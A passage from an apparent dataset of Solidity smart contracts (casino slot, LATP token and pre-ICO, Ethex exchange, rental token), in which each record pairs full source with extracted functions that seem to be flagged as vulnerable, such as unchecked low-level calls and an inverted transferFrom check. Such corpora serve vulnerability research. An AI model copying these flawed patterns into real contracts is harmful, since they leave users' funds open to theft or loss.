LOG_EmergencyWithdrawalVote(msg.sender, vote);\n }\n function proposeEmergencyWithdrawal(address withdrawalAddress)\n onlyIfStopped\n onlyOwner {\n for (uint i = 1; i <= numInvestors; i++) {\n delete investors[i].votedForEmergencyWithdrawal;\n }\n proposedWithdrawal = WithdrawalProposal(withdrawalAddress, now);\n LOG_EmergencyWithdrawalProposed();\n }\n function executeEmergencyWithdrawal()\n onlyOwner\n onlyAfterProposed\n onlyIfStopped\n onlyIfEmergencyTimeOutHasPassed {\n uint numOfVotesInFavour;\n uint amountToWithdraw = this.balance;\n for (uint i = 1; i <= numInvestors; i++) {\n if (investors[i].votedForEmergencyWithdrawal == true) {\n numOfVotesInFavour++;\n delete investors[i].votedForEmergencyWithdrawal;\n }\n }\n if (numOfVotesInFavour >= EMERGENCY_WITHDRAWAL_RATIO * numInvestors / 100) {\n if (!proposedWithdrawal.toAddress.send(amountToWithdraw)) {\n LOG_EmergencyWithdrawalFailed(proposedWithdrawal.toAddress);\n }\n else {\n LOG_EmergencyWithdrawalSucceeded(proposedWithdrawal.toAddress, amountToWithdraw);\n }\n }\n else {\n revert();\n }\n }\n function forceDivestOfOneInvestor(address currentInvestor)\n onlyOwner\n onlyIfStopped {\n divest(currentInvestor);\n delete proposedWithdrawal;\n }\n}\ncontract Slot is usingOraclize, EmergencyWithdrawalModule, DSMath {\n uint constant INVESTORS_EDGE = 200;\n uint constant HOUSE_EDGE = 50;\n uint constant CAPITAL_RISK = 250;\n uint constant MAX_SPINS = 16;\n uint minBet = 1 wei;\n struct SpinsContainer {\n address playerAddress;\n uint nSpins;\n uint amountWagered;\n }\n mapping (bytes32 => SpinsContainer) spins;\n uint[] public probabilities;\n uint[] public multipliers;\n uint public totalAmountWagered;\n event LOG_newSpinsContainer(bytes32 myid, address playerAddress, uint amountWagered, uint nSpins);\n event LOG_SpinExecuted(bytes32 myid, address playerAddress, uint spinIndex, uint numberDrawn, uint grossPayoutForSpin);\n event LOG_SpinsContainerInfo(bytes32 myid, address playerAddress, uint netPayout);\n LedgerProofVerifyI externalContract;\n function Slot(address _verifierAddr) {\n externalContract = LedgerProofVerifyI(_verifierAddr);\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n externalContract.external_oraclize_randomDS_setCommitment(queryId, commitment);\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n assert(externalContract.external_oraclize_randomDS_proofVerify(_proof, _queryId, bytes(_result), oraclize_getNetworkName()));\n _;\n }\n modifier onlyOraclize {\n assert(msg.sender == oraclize_cbAddress());\n _;\n }\n modifier onlyIfSpinsExist(bytes32 myid) {\n assert(spins[myid].playerAddress != address(0x0));\n _;\n }\n function isValidSize(uint _amountWagered)\n internal\n returns(bool) {\n uint netPotentialPayout = (_amountWagered * (10000 - INVESTORS_EDGE) * multipliers[0])/ 10000;\n uint maxAllowedPayout = (CAPITAL_RISK * getBankroll())/10000;\n return ((netPotentialPayout <= maxAllowedPayout) && (_amountWagered >= minBet));\n }\n modifier onlyIfEnoughFunds(bytes32 myid) {\n if (isValidSize(spins[myid].amountWagered)) {\n _;\n }\n else {\n address playerAddress = spins[myid].playerAddress;\n uint amountWagered = spins[myid].amountWagered;\n delete spins[myid];\n safeSend(playerAddress, amountWagered);\n return;\n }\n }\n modifier onlyValidNumberOfSpins (uint _nSpins) {\n assert(_nSpins <= MAX_SPINS);\n assert(_nSpins > 0);\n _;\n }\n modifier onlyIfFair(uint[] _prob, uint[] _payouts) {\n if (_prob.length != _payouts.length) revert();\n uint sum = 0;\n for (uint i = 0; i <_prob.length; i++) {\n sum += _prob[i] * _payouts[i];\n }\n assert(sum == 10000);\n _;\n }\n function()\n payable {\n buySpins(1);\n }\n function buySpins(uint _nSpins)\n payable\n onlyValidNumberOfSpins(_nSpins)\n onlyIfNotStopped {\n uint gas = _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", gas);\n assert(oraclizeFee/multipliers[0] + oraclizeFee < msg.value);\n uint amountWagered = msg.value - oraclizeFee;\n assert(isValidSize(amountWagered));\n bytes32 queryId = oraclize_newRandomDSQuery(0, 2*_nSpins, gas);\n spins[queryId] =\n SpinsContainer(msg.sender,\n _nSpins,\n amountWagered\n );\n LOG_newSpinsContainer(queryId, msg.sender, amountWagered, _nSpins);\n totalAmountWagered += amountWagered;\n }\n function executeSpins(bytes32 myid, bytes randomBytes)\n private\n returns(uint)\n {\n uint amountWonTotal = 0;\n uint amountWonSpin = 0;\n uint numberDrawn = 0;\n uint rangeUpperEnd = 0;\n uint nSpins = spins[myid].nSpins;\n for (uint i = 0; i < 2*nSpins; i += 2) {\n numberDrawn = ((uint(randomBytes[i])*256 + uint(randomBytes[i+1]))*10000)/2**16;\n rangeUpperEnd = 0;\n amountWonSpin = 0;\n for (uint j = 0; j < probabilities.length; j++) {\n rangeUpperEnd += probabilities[j];\n if (numberDrawn < rangeUpperEnd) {\n amountWonSpin = (spins[myid].amountWagered * multipliers[j]) / nSpins;\n amountWonTotal += amountWonSpin;\n break;\n }\n }\n LOG_SpinExecuted(myid, spins[myid].playerAddress, i/2, numberDrawn, amountWonSpin);\n }\n return amountWonTotal;\n }\n function sendPayout(bytes32 myid, uint payout) private {\n uint investorsFee = payout*INVESTORS_EDGE/10000;\n uint houseFee = payout*HOUSE_EDGE/10000;\n uint netPlayerPayout = sub(sub(payout,investorsFee), houseFee);\n uint netCostForInvestors = add(netPlayerPayout, houseFee);\n if (netCostForInvestors >= spins[myid].amountWagered) {\n investorsLosses += sub(netCostForInvestors, spins[myid].amountWagered);\n }\n else {\n investorsProfit += sub(spins[myid].amountWagered, netCostForInvestors);\n }\n LOG_SpinsContainerInfo(myid, spins[myid].playerAddress, netPlayerPayout);\n safeSend(spins[myid].playerAddress, netPlayerPayout);\n safeSend(houseAddress, houseFee);\n }\n function __callback(bytes32 myid, string result, bytes _proof)\n onlyOraclize\n onlyIfSpinsExist(myid)\n onlyIfEnoughFunds(myid)\n oraclize_randomDS_proofVerify(myid, result, _proof)\n {\n uint payout = executeSpins(myid, bytes(result));\n sendPayout(myid, payout);\n delete profitDistributed;\n delete spins[myid];\n }\n function setConfiguration(uint[] _probabilities, uint[] _multipliers)\n onlyOwner\n onlyIfFair(_probabilities, _multipliers) {\n oraclize_setProof(proofType_Ledger);\n delete probabilities;\n delete multipliers;\n uint lastProbability = 0;\n uint lastMultiplier = 2**256 - 1;\n for (uint i = 0; i < _probabilities.length; i++) {\n probabilities.push(_probabilities[i]);\n if (lastProbability >= _probabilities[i]) revert();\n lastProbability = _probabilities[i];\n }\n for (i = 0; i < _multipliers.length; i++) {\n multipliers.push(_multipliers[i]);\n if (lastMultiplier <= _multipliers[i]) revert();\n lastMultiplier = _multipliers[i];\n }\n }\n function setMinBet(uint _minBet) onlyOwner {\n minBet = _minBet;\n }\n function getSpinsContainer(bytes32 myid)\n constant\n returns(address, uint) {\n return (spins[myid].playerAddress, spins[myid].amountWagered);\n }\n function getMinAmountToWager(uint _nSpins)\n onlyValidNumberOfSpins(_nSpins)\n constant\n returns(uint) {\n uint gas = _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", gas);\n return minBet + oraclizeFee/multipliers[0] + oraclizeFee;\n }\n function getMaxAmountToWager(uint _nSpins)\n onlyValidNumberOfSpins(_nSpins)\n constant\n returns(uint) {\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas);\n uint maxWage = (CAPITAL_RISK * getBankroll())*10000/((10000 - INVESTORS_EDGE)*10000*multipliers[0]);\n return maxWage + oraclizeFee;\n }\n}",
  "extract_feature": [
    "function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\nbool ret;\naddress addr;\nassembly {\nlet size := mload(0x40)\nmstore(size, hash)\nmstore(add(size, 32), v)\nmstore(add(size, 64), r)\nmstore(add(size, 96), s)\nret := call(3000, 1, 0, size, 128, size, 32)\naddr := mload(size)\n}\nreturn (ret, addr);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1620"
  },
  "filename": "38550.sol",
  "content": "contract SafeMath {\n function mul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function sub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n function assert(bool assertion) internal {\n if (!assertion) {\n throw;\n }\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Issuance(address indexed _to, uint256 _value);\n event Burn(address indexed _from, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n string memory signature = \"receiveApproval(address,uint256,address,bytes)\";\n if (!_spender.call(bytes4(bytes32(sha3(signature))), msg.sender, _value, this, _extraData)) {\n throw;\n }\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract LATPToken is StandardToken, SafeMath {\n address public founder;\n address public minter;\n string public name = \"LATO PreICO\";\n uint8 public decimals = 6;\n string public symbol = \"LATP\";\n string public version = \"0.7.1\";\n uint public maxTotalSupply = 100000 * 1000000;\n modifier onlyFounder() {\n if (msg.sender != founder) {\n throw;\n }\n _;\n }\n modifier onlyMinter() {\n if (msg.sender != minter) {\n throw;\n }\n _;\n }\n function issueTokens(address _for, uint tokenCount)\n external\n payable\n onlyMinter\n returns (bool)\n {\n if (tokenCount == 0) {\n return false;\n }\n if (add(totalSupply, tokenCount) > maxTotalSupply) {\n throw;\n }\n totalSupply = add(totalSupply, tokenCount);\n balances[_for] = add(balances[_for], tokenCount);\n Issuance(_for, tokenCount);\n return true;\n }\n function burnTokens(address _for, uint tokenCount)\n external\n onlyMinter\n returns (bool)\n {\n if (tokenCount == 0) {\n return false;\n }\n if (sub(totalSupply, tokenCount) > totalSupply) {\n throw;\n }\n if (sub(balances[_for], tokenCount) > balances[_for]) {\n throw;\n }\n totalSupply = sub(totalSupply, tokenCount);\n balances[_for] = sub(balances[_for], tokenCount);\n Burn(_for, tokenCount);\n return true;\n }\n function changeMinter(address newAddress)\n public\n onlyFounder\n returns (bool)\n {\n minter = newAddress;\n }\n function changeFounder(address newAddress)\n public\n onlyFounder\n returns (bool)\n {\n founder = newAddress;\n }\n function () {\n throw;\n }\n function LATPToken() {\n founder = msg.sender;\n totalSupply = 0;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nstring memory signature = \"receiveApproval(address,uint256,address,bytes)\";\nif (!_spender.call(bytes4(bytes32(sha3(signature))), msg.sender, _value, this, _extraData)) {\nthrow;\n}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1621"
  },
  "filename": "38551.sol",
  "content": "contract SafeMath {\n function mul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function sub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n function assert(bool assertion) internal {\n if (!assertion) {\n throw;\n }\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Issuance(address indexed _to, uint256 _value);\n event Burn(address indexed _from, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n string memory signature = \"receiveApproval(address,uint256,address,bytes)\";\n if (!_spender.call(bytes4(bytes32(sha3(signature))), msg.sender, _value, this, _extraData)) {\n throw;\n }\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract LATPToken is StandardToken, SafeMath {\n address public founder;\n address public minter;\n string public name = \"LATO PreICO\";\n uint8 public decimals = 6;\n string public symbol = \"LATP\";\n string public version = \"0.7.1\";\n uint public maxTotalSupply = 100000 * 1000000;\n modifier onlyFounder() {\n if (msg.sender != founder) {\n throw;\n }\n _;\n }\n modifier onlyMinter() {\n if (msg.sender != minter) {\n throw;\n }\n _;\n }\n function issueTokens(address _for, uint tokenCount)\n external\n payable\n onlyMinter\n returns (bool)\n {\n if (tokenCount == 0) {\n return false;\n }\n if (add(totalSupply, tokenCount) > maxTotalSupply) {\n throw;\n }\n totalSupply = add(totalSupply, tokenCount);\n balances[_for] = add(balances[_for], tokenCount);\n Issuance(_for, tokenCount);\n return true;\n }\n function burnTokens(address _for, uint tokenCount)\n external\n onlyMinter\n returns (bool)\n {\n if (tokenCount == 0) {\n return false;\n }\n if (sub(totalSupply, tokenCount) > totalSupply) {\n throw;\n }\n if (sub(balances[_for], tokenCount) > balances[_for]) {\n throw;\n }\n totalSupply = sub(totalSupply, tokenCount);\n balances[_for] = sub(balances[_for], tokenCount);\n Burn(_for, tokenCount);\n return true;\n }\n function changeMinter(address newAddress)\n public\n onlyFounder\n returns (bool)\n {\n minter = newAddress;\n }\n function changeFounder(address newAddress)\n public\n onlyFounder\n returns (bool)\n {\n founder = newAddress;\n }\n function () {\n throw;\n }\n function LATPToken() {\n founder = msg.sender;\n totalSupply = 0;\n }\n}\ncontract LATOPreICO {\n LATPToken public latpToken = LATPToken(0x12826eACF16678A6Ab9772fB0751bca32F1F0F53);\n address public founder;\n uint256 public baseTokenPrice = 3 szabo;\n mapping (address => uint) public investments;\n event LATPTransaction(uint256 indexed transactionId, uint256 transactionValue, uint256 indexed timestamp);\n modifier onlyFounder() {\n if (msg.sender != founder) {\n throw;\n }\n _;\n }\n modifier minInvestment() {\n if (msg.value < baseTokenPrice) {\n throw;\n }\n _;\n }\n function fund()\n public\n minInvestment\n payable\n returns (uint)\n {\n uint tokenCount = msg.value / baseTokenPrice;\n uint investment = tokenCount * baseTokenPrice;\n if (msg.value > investment && !msg.sender.send(msg.value - investment)) {\n throw;\n }\n investments[msg.sender] += investment;\n if (!founder.send(investment)) {\n throw;\n }\n uint transactionId = 0;\n for (uint i = 0; i < 32; i++) {\n uint b = uint(msg.data[35 - i]);\n transactionId += b * 256**i;\n }\n LATPTransaction(transactionId, investment, now);\n return tokenCount;\n }\n function fundManually(address beneficiary, uint _tokenCount)\n external\n onlyFounder\n returns (uint)\n {\n uint investment = _tokenCount * baseTokenPrice;\n investments[beneficiary] += investment;\n if (!latpToken.issueTokens(beneficiary, _tokenCount)) {\n throw;\n }\n return _tokenCount;\n }\n function setTokenAddress(address _newTokenAddress)\n external\n onlyFounder\n returns (bool)\n {\n latpToken = LATPToken(_newTokenAddress);\n return true;\n }\n function changeBaseTokenPrice(uint valueInWei)\n external\n onlyFounder\n returns (bool)\n {\n baseTokenPrice = valueInWei;\n return true;\n }\n function LATOPreICO() {\n founder = msg.sender;\n }\n function () payable {\n fund();\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nstring memory signature = \"receiveApproval(address,uint256,address,bytes)\";\nif (!_spender.call(bytes4(bytes32(sha3(signature))), msg.sender, _value, this, _extraData)) {\nthrow;\n}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1622"
  },
  "filename": "38651.sol",
  "content": "pragma solidity ^0.4.11;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function assert(bool assertion) internal {\n if (!assertion) throw;\n }\n}\ncontract Token {\n function name() public constant returns (string name) { name; }\n function symbol() public constant returns (string symbol) { symbol; }\n function decimals() public constant returns (uint8 decimals) { decimals; }\n function totalSupply() public constant returns (uint256 totalSupply) { totalSupply; }\n function balanceOf(address _owner) public constant returns (uint256 balance) { _owner; balance; }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) { _owner; _spender; remaining; }\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n}\ncontract Ethex is SafeMath {\n address public admin;\n address public feeAccount;\n uint public sellFee;\n uint public buyFee;\n mapping (bytes32 => uint) public sellOrders;\n mapping (bytes32 => uint) public buyOrders;\n event BuyOrder(bytes32 order, address token, uint amount, uint price, address buyer);\n event SellOrder(bytes32 order,address token, uint amount, uint price, address seller);\n event CancelBuyOrder(bytes32 order, address token, uint price, address buyer);\n event CancelSellOrder(bytes32 order, address token, uint price, address seller);\n event Buy(bytes32 order, address token, uint amount, uint price, address buyer, address seller);\n event Sell(bytes32 order, address token, uint amount, uint price, address buyer, address seller);\n function Ethex(address admin_, address feeAccount_, uint buyFee_, uint sellFee_) {\n admin = admin_;\n feeAccount = feeAccount_;\n buyFee = buyFee_;\n sellFee = sellFee_;\n }\n function() {\n throw;\n }\n function changeAdmin(address admin_) {\n if (msg.sender != admin) throw;\n admin = admin_;\n }\n function changeFeeAccount(address feeAccount_) {\n if (msg.sender != admin) throw;\n feeAccount = feeAccount_;\n }\n function changeBuyFee(uint buyFee_) {\n if (msg.sender != admin) throw;\n if (buyFee_ > buyFee) throw;\n buyFee = buyFee_;\n }\n function changeSellFee(uint sellFee_) {\n if (msg.sender != admin) throw;\n if (sellFee_ > sellFee)\n sellFee = sellFee_;\n }\n function sellOrder(address token, uint tokenAmount, uint price) {\n bytes32 h = sha256(token, price, msg.sender);\n sellOrders[h] = safeAdd(sellOrders[h],tokenAmount);\n SellOrder(h, token, tokenAmount, price, msg.sender);\n }\n function buyOrder(address token, uint tokenAmount, uint price) payable {\n bytes32 h = sha256(token, price, msg.sender);\n uint totalCost = tokenAmount*price;\n if (totalCost < msg.value) throw;\n buyOrders[h] = safeAdd(buyOrders[h],msg.value);\n BuyOrder(h, token, tokenAmount, price, msg.sender);\n }\n function cancelSellOrder(address token, uint price) {\n bytes32 h = sha256(token, price, msg.sender);\n delete sellOrders[h];\n CancelSellOrder(h,token,price,msg.sender);\n }\n function cancelBuyOrder(address token, uint price) {\n bytes32 h = sha256(token, price, msg.sender);\n uint remain = buyOrders[h];\n delete buyOrders[h];\n if (!msg.sender.call.value(remain)()) throw;\n CancelBuyOrder(h,token,price,msg.sender);\n }\n function totalBuyPrice(uint amount, uint price) public constant returns (uint) {\n uint totalPriceNoFee = safeMul(amount, price);\n uint totalFee = safeMul(totalPriceNoFee, buyFee) / (1 ether);\n uint totalPrice = safeAdd(totalPriceNoFee,totalFee);\n return totalPrice;\n }\n function takeBuy(address token, uint amount, uint price, address buyer) payable {\n bytes32 h = sha256(token, price, buyer);\n uint totalPriceNoFee = safeMul(amount, price);\n uint totalFee = safeMul(totalPriceNoFee, buyFee) / (1 ether);\n uint totalPrice = safeAdd(totalPriceNoFee,totalFee);\n if (buyOrders[h] < amount) throw;\n if (totalPrice > msg.value) throw;\n if (Token(token).allowance(msg.sender,this) < amount) throw;\n if (Token(token).transferFrom(msg.sender,buyer,amount)) throw;\n buyOrders[h] = safeSub(buyOrders[h], amount);\n if (!feeAccount.send(totalFee)) throw;\n uint leftOver = msg.value - totalPrice;\n if (leftOver>0)\n if (!msg.sender.send(leftOver)) throw;\n Buy(h, token, amount, totalPrice, buyer, msg.sender);\n }\n function totalSellPrice(uint amount, uint price) public constant returns (uint) {\n uint totalPriceNoFee = safeMul(amount, price);\n uint totalFee = safeMul(totalPriceNoFee, buyFee) / (1 ether);\n uint totalPrice = safeSub(totalPriceNoFee,totalFee);\n return totalPrice;\n }\n function takeSell(address token, uint amount,uint price, address seller) payable {\n bytes32 h = sha256(token, price, seller);\n uint totalPriceNoFee = safeMul(amount, price);\n uint totalFee = safeMul(totalPriceNoFee, buyFee) / (1 ether);\n uint totalPrice = safeSub(totalPriceNoFee,totalFee);\n if (sellOrders[h] < amount) throw;\n if (Token(token).allowance(seller,this) < amount) throw;\n if (!Token(token).transferFrom(seller,msg.sender,amount)) throw;\n sellOrders[h] = safeSub(sellOrders[h],amount);\n if (!seller.send(totalPrice)) throw;\n if (!feeAccount.send(totalFee)) throw;\n Sell(h, token, amount, totalPrice, msg.sender, seller);\n }\n}",
  "extract_feature": [
    "function takeBuy(address token, uint amount, uint price, address buyer) payable {\nbytes32 h = sha256(token, price, buyer);\nuint totalPriceNoFee = safeMul(amount, price);\nuint totalFee = safeMul(totalPriceNoFee, buyFee) / (1 ether);\nuint totalPrice = safeAdd(totalPriceNoFee,totalFee);\nif (buyOrders[h] < amount) throw;\nif (totalPrice > msg.value) throw;\nif (Token(token).allowance(msg.sender,this) < amount) throw;\nif (Token(token).transferFrom(msg.sender,buyer,amount)) throw;\nbuyOrders[h] = safeSub(buyOrders[h], amount);\nif (!feeAccount.send(totalFee)) throw;\nuint leftOver = msg.value - totalPrice;\nif (leftOver>0)\nif (!msg.sender.send(leftOver)) throw;\nBuy(h, token, amount, totalPrice, buyer, msg.sender);\n}",
    "function takeSell(address token, uint amount,uint price, address seller) payable {\nbytes32 h = sha256(token, price, seller);\nuint totalPriceNoFee = safeMul(amount, price);\nuint totalFee = safeMul(totalPriceNoFee, buyFee) / (1 ether);\nuint totalPrice = safeSub(totalPriceNoFee,totalFee);\nif (sellOrders[h] < amount) throw;\nif (Token(token).allowance(seller,this) < amount) throw;\nif (!Token(token).transferFrom(seller,msg.sender,amount)) throw;\nsellOrders[h] = safeSub(sellOrders[h],amount);\nif (!seller.send(totalPrice)) throw;\nif (!feeAccount.send(totalFee)) throw;\nSell(h, token, amount, totalPrice, msg.sender, seller);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1623"
  },
  "filename": "38721.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Owned {\n address public owner;\n function changeOwner(address _addr) onlyOwner {\n if (_addr == 0x0) throw;\n owner = _addr;\n }\n modifier onlyOwner {\n if (msg.sender != owner) throw;\n _;\n }\n}\ncontract Mutex is Owned {\n bool locked = false;\n modifier mutexed {\n if (locked) throw;\n locked = true;\n _;\n locked = false;\n }\n function unMutex() onlyOwner {\n locked = false;\n }\n}\ncontract Rental is Owned {\n function Rental(address _owner) {\n if (_owner == 0x0) throw;\n owner = _owner;\n }\n function offer(address from, uint num) {\n }\n function claimBalance(address) returns(uint) {\n return 0;\n }\n function exec(address dest) onlyOwner {\n if (!dest.call(msg.data)) throw;\n }\n}\ncontract Token is Owned, Mutex {\n uint ONE = 10**8;\n uint price = 5000;\n Ledger ledger;\n Rental rentalContract;\n uint8 rollOverTime = 4;\n uint8 startTime = 8;\n bool live = false;\n address club;\n uint lockedSupply = 0;\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '0.1';\n bool transfersOn = false;\n function Token(address _owner, string _tokenName, uint8 _decimals, string _symbol, address _ledger, address _rental) {\n if (_owner == 0x0) throw;\n owner = _owner;\n name = _tokenName;\n decimals = _decimals;\n symbol = _symbol;\n ONE = 10**uint(decimals);\n ledger = Ledger(_ledger);\n rentalContract = Rental(_rental);\n }\n event LedgerUpdated(address,address);\n function changeClub(address _addr) onlyOwner {\n if (_addr == 0x0) throw;\n club = _addr;\n }\n function changePrice(uint _num) onlyOwner {\n price = _num;\n }\n function safeAdd(uint a, uint b) returns (uint) {\n if ((a + b) < a) throw;\n return (a + b);\n }\n function changeLedger(address _addr) onlyOwner {\n if (_addr == 0x0) throw;\n LedgerUpdated(msg.sender, _addr);\n ledger = Ledger(_addr);\n }\n function changeRental(address _addr) onlyOwner {\n if (_addr == 0x0) throw;\n rentalContract = Rental(_addr);\n }\n function changeTimes(uint8 _rollOver, uint8 _start) onlyOwner {\n rollOverTime = _rollOver;\n startTime = _start;\n }\n function lock(address _seizeAddr) onlyOwner mutexed {\n uint myBalance = ledger.balanceOf(_seizeAddr);\n lockedSupply += myBalance;\n ledger.setBalance(_seizeAddr, 0);\n }\n event Dilution(address, uint);\n function dilute(address _destAddr, uint amount) onlyOwner {\n if (amount > lockedSupply) throw;\n Dilution(_destAddr, amount);\n lockedSupply -= amount;\n uint curBalance = ledger.balanceOf(_destAddr);\n curBalance = safeAdd(amount, curBalance);\n ledger.setBalance(_destAddr, curBalance);\n }\n function completeCrowdsale() onlyOwner {\n transfersOn = true;\n lock(owner);\n }\n function pauseTransfers() onlyOwner {\n transfersOn = false;\n }\n function resumeTransfers() onlyOwner {\n transfersOn = true;\n }\n function rentOut(uint num) {\n if (ledger.balanceOf(msg.sender) < num) throw;\n rentalContract.offer(msg.sender, num);\n ledger.tokenTransfer(msg.sender, rentalContract, num);\n }\n function claimUnrented() {\n uint amount = rentalContract.claimBalance(msg.sender);\n ledger.tokenTransfer(rentalContract, msg.sender, amount);\n }\n function burn(uint _amount) {\n uint balance = ledger.balanceOf(msg.sender);\n if (_amount > balance) throw;\n ledger.setBalance(msg.sender, balance - _amount);\n }\n function checkIn(uint _numCheckins) returns(bool) {\n int needed = int(price * ONE* _numCheckins);\n if (int(ledger.balanceOf(msg.sender)) > needed) {\n ledger.changeUsed(msg.sender, needed);\n return true;\n }\n return false;\n }\n event Transfer(address, address, uint);\n event Approval(address, address, uint);\n function totalSupply() constant returns(uint) {\n return ledger.totalSupply();\n }\n function transfer(address _to, uint _amount) returns(bool) {\n if (!transfersOn && msg.sender != owner) return false;\n if (! ledger.tokenTransfer(msg.sender, _to, _amount)) { return false; }\n Transfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint _amount) returns (bool) {\n if (!transfersOn && msg.sender != owner) return false;\n if (! ledger.tokenTransferFrom(msg.sender, _from, _to, _amount) ) { return false;}\n Transfer(msg.sender, _to, _amount);\n return true;\n }\n function allowance(address _from, address _to) constant returns(uint) {\n return ledger.allowance(_from, _to);\n }\n function approve(address _spender, uint _value) returns (bool) {\n if ( ledger.tokenApprove(msg.sender, _spender, _value) ) {\n Approval(msg.sender, _spender, _value);\n return true;\n }\n return false;\n }\n function balanceOf(address _addr) constant returns(uint) {\n return 